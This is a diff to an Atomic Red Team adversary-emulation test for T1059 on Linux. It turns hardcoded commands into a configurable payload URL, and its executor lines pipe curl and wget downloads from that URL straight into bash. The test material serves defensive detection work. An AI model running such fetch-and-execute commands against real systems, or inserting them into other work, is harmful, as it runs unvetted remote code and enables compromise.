@@ -14,9 +14,15 @@ atomic_tests:
     - centos
     - ubuntu
     - linux
+    
+  input_arguments:
+    payload_sh_path:
+      description: URL of the payload .sh file
+      type: Url
+      default: https://raw.githubusercontent.com/xenoscr/atomic-red-team/master/atomics/T1059/echo-art-fish.sh
 
   executor:
     name: sh
     command: |
-      bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"
-      bash -c "wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Atomics/T1059/echo-art-fish.sh | bash"
+      bash -c "curl -sS #{payload_sh_path} | bash"
+      bash -c "wget --quiet -O - #{payload_sh_path} | bash"
